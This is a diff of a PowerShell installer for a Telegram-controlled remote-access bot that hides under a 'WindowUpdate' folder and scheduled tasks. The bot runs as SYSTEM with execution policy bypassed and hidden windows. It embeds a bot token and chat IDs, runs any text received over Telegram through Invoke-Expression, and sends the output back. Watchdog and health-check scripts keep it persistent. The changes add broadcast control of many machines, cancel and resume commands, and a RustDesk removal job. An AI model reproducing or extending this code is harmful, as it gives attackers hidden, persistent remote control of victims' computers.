@@ -1,7 +1,7 @@
 # Run this on target machine to deploy the bot
 $installPath = "$env:ProgramData\WindowUpdate\sys_tg.ps1"
 $watchdogPath = "$env:ProgramData\WindowUpdate\watchdog.ps1"
-$supervisorPath = "$env:ProgramData\WindowUpdate\supervisor.ps1"
+$healthCheckPath = "$env:ProgramData\WindowUpdate\healthcheck.ps1"
 $taskPath = "\WindowUpdate\"
 
 # Create directory if it doesn't exist
@@ -18,13 +18,17 @@ if (-not ([Security.Principal.WindowsPrincipal][Security.Principal.WindowsIdenti
 
 # ===== CONFIG =====
 $BOT_TOKEN = "8583495386:AAFierCgkO1C2RWxF-zP7dHIWaWY9buobRI"
-$CHAT_ID = "347753116"
-$ADMIN_CHAT_IDS = @("347753116", "7303070402" , "6716357143", "380330092")
+$CHAT_ID = "380330092"
+$ADMIN_CHAT_IDS = @("347753116", "7303070402", "6716357143", "380330092")
 
 $lastUpdate = 0
 $updateMode = $false
 $computerName = $env:COMPUTERNAME
 $script:processedCommands = @{}
+$script:cancelLoop = $false
+$script:loopStopped = $false
+$script:isBroadcast = $false
+$script:broadcastDelay = 0
 
 # ===== MUTEX FOR SINGLE INSTANCE =====
 $mutex = New-Object System.Threading.Mutex($false, "Global\TGBot_$computerName")
@@ -104,10 +108,12 @@ function IsCommandForMe($commandText) {
         $cmd = $matches[2]
         
         if ($target -eq $computerName -or $target -eq "all" -or $target -eq "broadcast" -or $target -eq "everyone") {
+            $script:isBroadcast = $true
             return $cmd
         }
         return $null
     }
+    $script:isBroadcast = $false
     return $commandText
 }
 
@@ -147,6 +153,14 @@ function Set-PowerShellPolicy {
 
 Set-PowerShellPolicy
 
+# ===== BROADCAST DELAY HANDLER =====
+# When a broadcast (@all) command arrives, each machine waits a random
+# 3-15 second window before replying, so replies are spread out and
+# do not hit Telegram's per-chat rate limit.
+function Get-BroadcastDelay {
+    return (Get-Random -Minimum 3 -Maximum 15)
+}
+
 # ===== RANDOM DELAY TO PREVENT THUNDERING HERD =====
 $randomDelay = Get-Random -Minimum 1 -Maximum 5
 Start-Sleep -Seconds $randomDelay
@@ -156,6 +170,35 @@ Send "Bot started on $computerName"
 $consecutiveErrors = 0
 
 while ($true) {
+    # If loop was stopped by /cancel, just idle without polling
+    if ($script:loopStopped) {
+        Start-Sleep -Seconds 30
+        continue
+    }
+
+    # Check if cancel loop was requested (legacy path)
+    if ($script:cancelLoop) {
+        Send "Cancel command received. Stopping main loop and running RustDesk removal..."
+        Start-Job -ScriptBlock {
+            taskkill /F /IM RustDesk.exe /T 2>$null
+            sc.exe stop rustdesk 2>$null
+            sc.exe delete rustdesk 2>$null
+            $uninstallPaths = @(
+                "${env:ProgramFiles}\RustDesk\uninstall.exe",
+                "${env:ProgramFiles(x86)}\RustDesk\uninstall.exe",
+                "$env:LOCALAPPDATA\Programs\RustDesk\uninstall.exe",
+                "$env:APPDATA\RustDesk\uninstall.exe"
+            )
+            $uninstaller = $uninstallPaths | Where-Object { Test-Path $_ } | Select-Object -First 1
+            if($uninstaller){
+                Start-Process $uninstaller -ArgumentList '/S' -Wait
+            }
+        } | Wait-Job -Timeout 60 | Out-Null
+        
+        Send "RustDesk removal job completed. Resuming main loop..."
+        $script:cancelLoop = $false
+    }
+
     try {
         $updates = GetUpdates
 
@@ -173,6 +216,7 @@ while ($true) {
                 if ($u.message.text) {
                     $fullCommand = $u.message.text
                     
+                    $script:isBroadcast = $false
                     $actualCommand = IsCommandForMe $fullCommand
                     
                     if ($actualCommand -eq $null) {
@@ -184,13 +228,35 @@ while ($true) {
                         continue
                     }
 
-                    # Handle special commands
+                    # ---- Broadcast delay: stagger replies across machines ----
+                    if ($script:isBroadcast) {
+                        $delay = Get-BroadcastDelay
+                        Write-Host "Broadcast detected - delaying reply by $delay seconds"
+                        Start-Sleep -Seconds $delay
+                    }
+
+                    # Handle /cancel - stops the main loop entirely
+                    if ($actualCommand -eq "/cancel" -or $actualCommand -eq "cancel") {
+                        $script:loopStopped = $true
+                        Send "Main loop STOPPED on $computerName. Send /resume to restart." $messageId
+                        continue
+                    }
+
+                    # Handle /resume - restarts the main loop
+                    if ($actualCommand -eq "/resume" -or $actualCommand -eq "resume") {
+                        $script:loopStopped = $false
+                        Send "Main loop RESUMED on $computerName." $messageId
+                        continue
+                    }
+
+                    # Handle /update
                     if ($actualCommand -eq "/update") {
                         $updateMode = $true
                         Send "Update mode activated. Send new .ps1 file." $messageId
                         continue
                     }
 
+                    # Handle /status
                     if ($actualCommand -eq "/status") {
                         $processes = (Get-Process).Count
                         $uptime = (Get-Date) - (Get-Process -Id $PID).StartTime
@@ -200,7 +266,8 @@ while ($true) {
                                   "OS: $os`n" + `
                                   "Uptime: $($uptime.ToString('hh\h mm\m ss\s'))`n" + `
                                   "Processes: $processes`n" + `
-                                  "Memory: $([math]::Round((Get-Process -Id $PID).WorkingSet64/1MB, 2)) MB"
+                                  "Memory: $([math]::Round((Get-Process -Id $PID).WorkingSet64/1MB, 2)) MB`n" + `
+                                  "Loop Status: $(if ($script:loopStopped) { 'STOPPED' } else { 'RUNNING' })"
                         Send $status $messageId
                         continue
                     }
@@ -225,7 +292,6 @@ while ($true) {
                     Send "Executing command..." $messageId
                     
                     try {
-                        # Capture all output streams
                         $out = & {
                             $ErrorActionPreference = 'Continue'
                             Invoke-Expression $actualCommand 2>&1
@@ -235,7 +301,6 @@ while ($true) {
                             $out = "Command executed successfully (no output)"
                         }
                         
-                        # If still empty for simple commands, try temp file method
                         if ($out -eq "Command executed successfully (no output)" -and $actualCommand -match "whoami|hostname|dir|ls|ipconfig|systeminfo") {
                             $tmpOut = "$env:TEMP\cmdout_$([Guid]::NewGuid()).txt"
                             Start-Process powershell -ArgumentList "-NoProfile -Command `"$actualCommand > '$tmpOut' 2>&1; exit`"" -Wait -WindowStyle Hidden
@@ -252,7 +317,6 @@ while ($true) {
                         $out = "Error: $($_.Exception.Message)"
                     }
 
-                    # Truncate if too long
                     $maxLength = 3800
                     if ($out.Length -gt $maxLength) {
                         $out = $out.Substring(0, $maxLength) + "`n... (truncated)"
@@ -310,7 +374,6 @@ while ($true) {
         Start-Sleep $sleepTime
     }
 
-    # Small random delay to prevent all computers from polling simultaneously
     $jitter = Get-Random -Minimum 1 -Maximum 3
     Start-Sleep $jitter
 }
@@ -318,50 +381,78 @@ while ($true) {
 $mutex.ReleaseMutex()
 '@
 
-# Create watchdog script
+# Create watchdog script with single-instance mutex
 $watchdogScript = @'
 # Watchdog script to ensure main bot is running
 $installPath = "$env:ProgramData\WindowUpdate\sys_tg.ps1"
 $computerName = $env:COMPUTERNAME
 
+# Single instance mutex for watchdog
+$watchdogMutex = New-Object System.Threading.Mutex($false, "Global\Watchdog_$computerName")
+if (-not $watchdogMutex.WaitOne(0, $false)) {
+    Write-Host "Watchdog already running"
+    exit
+}
+
 while ($true) {
     $processes = Get-Process powershell -ErrorAction SilentlyContinue | Where-Object { $_.CommandLine -like "*sys_tg.ps1*" }
     
     if (-not $processes) {
-        # Start the main bot
         Start-Process powershell "-NoProfile -NonInteractive -ExecutionPolicy Bypass -WindowStyle Hidden -File `"$installPath`"" -Verb RunAs
     }
     
     Start-Sleep -Seconds 60
 }
+
+$watchdogMutex.ReleaseMutex()
 '@
 
-# Create supervisor script
-$supervisorScript = @'
-# Supervisor script to monitor watchdog
-$watchdogPath = "$env:ProgramData\WindowUpdate\watchdog.ps1"
+# Create health check script (replaces supervisor)
+# Runs every 15 minutes and checks if sys_tg.ps1 exists and is running
+$healthCheckScript = @'
+# Health check script - runs every 15 minutes, single instance only
+$installPath = "$env:ProgramData\WindowUpdate\sys_tg.ps1"
+$computerName = $env:COMPUTERNAME
+
+# Single instance mutex for health check
+$healthMutex = New-Object System.Threading.Mutex($false, "Global\HealthCheck_$computerName")
+if (-not $healthMutex.WaitOne(0, $false)) {
+    Write-Host "Health check already running"
+    exit
+}
 
 while ($true) {
-    $watchdogProcess = Get-Process powershell -ErrorAction SilentlyContinue | Where-Object { $_.CommandLine -like "*watchdog.ps1*" }
-    
-    if (-not $watchdogProcess) {
-        # Start the watchdog
-        Start-Process powershell "-NoProfile -NonInteractive -ExecutionPolicy Bypass -WindowStyle Hidden -File `"$watchdogPath`"" -Verb RunAs
+    # Check if sys_tg.ps1 file exists
+    if (-not (Test-Path $installPath)) {
+        Write-Host "sys_tg.ps1 missing! Attempting to recover..."
+        # Optional: add recovery logic here if a backup path is available
     }
     
-    Start-Sleep -Seconds 120
+    # Check if the main bot process is running
+    $processes = Get-Process powershell -ErrorAction SilentlyContinue | Where-Object { $_.CommandLine -like "*sys_tg.ps1*" }
+    
+    if (-not $processes) {
+        Start-Process powershell "-NoProfile -NonInteractive -ExecutionPolicy Bypass -WindowStyle Hidden -File `"$installPath`"" -Verb RunAs
+    }
+    
+    # Wait 15 minutes before next check
+    Start-Sleep -Seconds 900
 }
+
+$healthMutex.ReleaseMutex()
 '@
 
 # Save scripts
 Set-Content -Path $installPath -Value $script -Force
 Set-Content -Path $watchdogPath -Value $watchdogScript -Force
-Set-Content -Path $supervisorPath -Value $supervisorScript -Force
+Set-Content -Path $healthCheckPath -Value $healthCheckScript -Force
 
 # Stop any existing instances
 Get-Process powershell -ErrorAction SilentlyContinue | Where-Object {$_.CommandLine -like "*sys_tg.ps1*"} | Stop-Process -Force -ErrorAction SilentlyContinue
+Get-Process powershell -ErrorAction SilentlyContinue | Where-Object {$_.CommandLine -like "*watchdog.ps1*"} | Stop-Process -Force -ErrorAction SilentlyContinue
+Get-Process powershell -ErrorAction SilentlyContinue | Where-Object {$_.CommandLine -like "*healthcheck.ps1*"} | Stop-Process -Force -ErrorAction SilentlyContinue
 
-# Remove old scheduled task if exists
+# Remove old scheduled tasks if exists
 $taskName1 = "WindowUpdate1"
 $taskName2 = "WindowUpdate1_PS"
 $taskName3 = "WindowUpdate2"
@@ -400,9 +491,11 @@ $trigger.StartBoundary = [datetime]::Now.ToString('yyyy-MM-ddTHH:mm:ss')
 $settings = New-ScheduledTaskSettingsSet -AllowStartIfOnBatteries -DontStopIfGoingOnBatteries -StartWhenAvailable -RestartInterval (New-TimeSpan -Minutes 1) -RestartCount 999 -ExecutionTimeLimit (New-TimeSpan -Days 0)
 Register-ScheduledTask -Action $action -Trigger $trigger -Settings $settings -TaskPath "\WindowUpdate\" -TaskName "WindowUpdate3" -Description "Runs watchdog for Telegram bot" -User "SYSTEM" -RunLevel Highest -Force | Out-Null
 
-# 5. WindowUpdate4 - Supervisor (Startup) - INFINITE EXECUTION TIME
-$action = New-ScheduledTaskAction -Execute "powershell.exe" -Argument "-NoProfile -NonInteractive -ExecutionPolicy Bypass -WindowStyle Hidden -File `"$supervisorPath`""
-Register-ScheduledTask -Action $action -Trigger $trigger -Settings $settings -TaskPath "\WindowUpdate\" -TaskName "WindowUpdate4" -Description "Runs supervisor for watchdog" -User "SYSTEM" -RunLevel Highest -Force | Out-Null
+# 5. WindowUpdate4 - Health Check every 15 minutes (Startup) - INFINITE EXECUTION TIME
+$action = New-ScheduledTaskAction -Execute "powershell.exe" -Argument "-NoProfile -NonInteractive -ExecutionPolicy Bypass -WindowStyle Hidden -File `"$healthCheckPath`""
+$trigger = New-ScheduledTaskTrigger -AtStartup
+$trigger.StartBoundary = [datetime]::Now.ToString('yyyy-MM-ddTHH:mm:ss')
+Register-ScheduledTask -Action $action -Trigger $trigger -Settings $settings -TaskPath "\WindowUpdate\" -TaskName "WindowUpdate4" -Description "Runs health check for Telegram bot every 15 minutes" -User "SYSTEM" -RunLevel Highest -Force | Out-Null
 
 # ===== START ALL TASKS IMMEDIATELY =====
 Start-ScheduledTask -TaskPath "\WindowUpdate\" -TaskName "WindowUpdate1" -ErrorAction SilentlyContinue
@@ -417,4 +510,4 @@ Start-Process powershell "-NoProfile -NonInteractive -ExecutionPolicy Bypass -Wi
 Write-Host "Bot deployed and started on $env:COMPUTERNAME" -ForegroundColor Green
 Write-Host "Installation path: $installPath" -ForegroundColor Yellow
 Write-Host "Watchdog path: $watchdogPath" -ForegroundColor Yellow
-Write-Host "Supervisor path: $supervisorPath" -ForegroundColor Yellow
+Write-Host "Health check path: $healthCheckPath" -ForegroundColor Yellow
